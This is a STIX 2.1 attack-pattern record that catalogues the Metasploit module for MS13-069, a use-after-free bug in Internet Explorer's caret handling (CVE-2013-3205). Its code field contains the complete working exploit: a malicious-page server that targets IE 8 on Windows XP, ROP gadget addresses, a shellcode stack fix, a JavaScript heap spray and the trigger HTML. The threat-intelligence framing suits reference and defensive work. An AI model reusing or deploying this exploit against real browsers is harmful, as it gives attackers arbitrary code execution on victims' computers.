{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--b1f71161-da58-45a9-97b7-b5293bb079f0",
    "created": "2024-08-14T16:42:57.753513Z",
    "modified": "2024-08-14T16:42:57.753517Z",
    "name": "\"MS13-069 Microsoft Internet Explorer CCaret Use-After-Free\"",
    "description": " This module exploits a use-after-free vulnerability found in Internet Explorer specifically in how the browser handles the caret (text cursor) object. In IE's standards mode, the caret handling's vulnerable state can be triggered by first setting up an editable page with an input field, and then we can force the caret to update in an onbeforeeditfocus event by setting the body's innerHTML property. In this event handler mshtml!CCaret::`vftable' can be freed using a document.write() function, however mshtml!CCaret::UpdateScreenCaret remains unaware of this change, and still uses the same reference to the CCaret object. When the function tries to use this invalid reference to call a virtual function at offset 0x2c, it finally results a crash. Precise control of the freed object allows arbitrary code execution under the context of the user.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/browser/ms13_069_caret.rb",
            "external_id": "ms13_069_caret.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2013-3205"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = NormalRanking\n\n  include Msf::Exploit::Remote::HttpServer::HTML\n  include Msf::Exploit::RopDb\n\n  def initialize(info={})\n    super(update_info(info,\n      'Name'           => \"MS13-069 Microsoft Internet Explorer CCaret Use-After-Free\",\n      'Description'    => %q{\n        This module exploits a use-after-free vulnerability found in Internet Explorer,\n        specifically in how the browser handles the caret (text cursor) object. In IE's standards\n        mode, the caret handling's vulnerable state can be triggered by first setting up an\n        editable page with an input field, and then we can force the caret to update in an\n        onbeforeeditfocus event by setting the body's innerHTML property. In this event handler,\n        mshtml!CCaret::`vftable' can be freed using a document.write() function, however,\n        mshtml!CCaret::UpdateScreenCaret remains unaware of this change, and still uses the\n        same reference to the CCaret object. When the function tries to use this invalid reference\n        to call a virtual function at offset 0x2c, it finally results a crash. Precise control of\n        the freed object allows arbitrary code execution under the context of the user.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'corelanc0d3r', # Vuln discovery & PoC (@corelanc0d3r)\n          'sinn3r'        # Metasploit           (@_sinn3r)\n        ],\n      'References'     =>\n        [\n          [ 'CVE', '2013-3205' ],\n          [ 'OSVDB', '97094' ],\n          [ 'MSB', 'MS13-069'  ],\n          [ 'ZDI', '13-217' ]\n        ],\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          [\n            # Win 7 target on hold until we have a stable custom spray for it\n            'IE 8 on Windows XP SP3',\n            {\n              'Rop'         => :msvcrt,\n              'TargetAddr'  => 0x1ec20101, # Allocs @ 1ec20020 (+0xe1 bytes to be null-byte free) - in ecx\n              'PayloadAddr' => 0x1ec20105, # where the ROP payload begins\n              'Pivot'       => 0x77C4FA1A, # mov esp,ebx; pop ebx; ret\n              'PopESP'      => 0x77C37422, # pop esp; ret (pivot to a bigger space)\n              'Align'       => 0x77c4d801  # add esp, 0x2c; ret (ROP gadget to jmp over pivot gadget)\n            }\n          ]\n        ],\n      'Payload'        =>\n        {\n          # Our property sprays dislike null bytes\n          'BadChars' => \"\\x00\",\n          # Fix the stack again before the payload is executed.\n          # If we don't do this, meterpreter fails due to a bad socket.\n          'Prepend'        => \"\\x64\\xa1\\x18\\x00\\x00\\x00\" + # mov eax, fs:[0x18]\n                              \"\\x83\\xC0\\x08\"             + # add eax, byte 8\n                              \"\\x8b\\x20\"                 + # mov esp, [eax]\n                              \"\\x81\\xC4\\x30\\xF8\\xFF\\xFF\",  # add esp, -2000\n          # Fall back to the previous allocation so we have plenty of space\n          # for the decoder to use\n          'PrependEncoder' => \"\\x81\\xc4\\x80\\xc7\\xfe\\xff\"   # add esp, -80000\n\n        },\n      'DefaultOptions' =>\n        {\n          'InitialAutoRunScript' => 'post/windows/manage/priv_migrate'\n        },\n      'Privileged'     => false,\n      'DisclosureDate' => '2013-09-10',\n      'DefaultTarget'  => 0))\n  end\n\n\n  def get_target(agent)\n    return targets[0] if agent =~ /MSIE 8\\.0/ and agent =~ /Windows NT 5\\.1/\n    nil\n  end\n\n\n  def get_payload(t)\n    # This data should appear at the beginning of the target address (see TargetAddr in metadata)\n    p = ''\n    p << rand_text_alpha(225)                     # Padding to avoid null byte addr\n    p << [t['TargetAddr']].pack(\"V*\")             # For mov ecx,dword ptr [eax]\n    p << [t['Align']].pack(\"V*\") * ( (0x2c-4)/4 ) # 0x2c bytes to pivot (-4 for TargetAddr)\n    p << [t['Pivot']].pack(\"V*\")                  # Stack pivot\n    p << rand_text_alpha(4)                       # Padding for the add esp,0x2c alignment\n    p << generate_rop_payload('msvcrt', payload.encoded, {'target'=>'xp'})\n\n    p\n  end\n\n\n  #\n  # Notes:\n  # * A custom spray is used (see function putPayload), because document.write() keeps freeing\n  #   our other sprays like js_property_spray or the heaplib + substring approach. This spray\n  #   seems unstable for Win 7, we'll have to invest more time on that.\n  # * Object size = 0x30\n  #\n  def get_html(t)\n    js_payload_addr = ::Rex::Text.to_unescape([t['PayloadAddr']].pack(\"V*\"))\n    js_target_addr  = ::Rex::Text.to_unescape([t['TargetAddr']].pack(\"V*\"))\n    js_pop_esp      = ::Rex::Text.to_unescape([t['PopESP']].pack(\"V*\"))\n    js_payload      = ::Rex::Text.to_unescape(get_payload(t))\n    js_rand_dword   = ::Rex::Text.to_unescape(rand_text_alpha(4))\n\n    html = %Q|<!DOCTYPE html>\n    <html>\n    <head>\n    <script>\n    var freeReady = false;\n\n    function getObject() {\n      var obj = '';\n      for (i=0; i < 11; i++) {\n        if (i==1) {\n          obj += unescape(\"#{js_pop_esp}\");\n        }\n        else if (i==2) {\n          obj += unescape(\"#{js_payload_addr}\");\n        }\n        else if (i==3) {\n          obj += unescape(\"#{js_target_addr}\");\n        }\n        else {\n          obj += unescape(\"#{js_rand_dword}\");\n        }\n      }\n      obj += \"\\\\u4545\";\n      return obj;\n    }\n\n    function emptyAllocator(obj) {\n      for (var i = 0; i < 40; i++)\n      {\n        var e = document.createElement('div');\n        e.className = obj;\n      }\n    }\n\n    function spray(obj) {\n      for (var i = 0; i < 50; i++)\n      {\n        var e = document.createElement('div');\n        e.className = obj;\n        document.appendChild(e);\n      }\n    }\n\n    function putPayload() {\n      var p = unescape(\"#{js_payload}\");\n      var block = unescape(\"#{js_rand_dword}\");\n      while (block.length < 0x80000) block += block;\n      block = p + block.substring(0, (0x80000-p.length-6)/2);\n\n      for (var i = 0; i < 0x300; i++)\n      {\n        var e = document.createElement('div');\n        e.className = block;\n        document.appendChild(e);\n      }\n    }\n\n    function trigger() {\n      if (freeReady) {\n        var obj = getObject();\n        emptyAllocator(obj);\n        document.write(\"#{rand_text_alpha(1)}\");\n        spray(obj);\n        putPayload();\n      }\n    }\n\n    window.onload = function() {\n      document.body.contentEditable = 'true';\n      document.execCommand('InsertInputPassword');\n      document.body.innerHTML = '#{rand_text_alpha(1)}';\n      freeReady = true;\n    }\n    </script>\n    </head>\n    <body onbeforeeditfocus=\"trigger()\">\n    </body>\n    </html>\n    |\n\n    html.gsub(/^\\x20\\x20\\x20\\x20/, '')\n  end\n\n\n  def on_request_uri(cli, request)\n    agent = request.headers['User-Agent']\n    t = get_target(agent)\n\n    unless t\n      print_error(\"Not a suitable target: #{agent}\")\n      send_not_found(cli)\n      return\n    end\n\n    html = get_html(t)\n\n    print_status(\"Sending exploit...\")\n    send_response(cli, html, {'Content-Type'=>'text/html', 'Cache-Control'=>'no-cache'})\n  end\nend\n\n=begin\n\nIn mshtml!CCaret::UpdateScreenCaret function:\n.text:63620F82                 mov     ecx, [eax]      ; crash\n.text:63620F84                 lea     edx, [esp+110h+var_A4]\n.text:63620F88                 push    edx\n.text:63620F89                 push    eax\n.text:63620F8A                 call    dword ptr [ecx+2Ch]\n\n=end\n",
    "x_mitre_disclosure_date": "2013-09-10",
    "x_mitre_platforms": [
        "win'"
    ]
}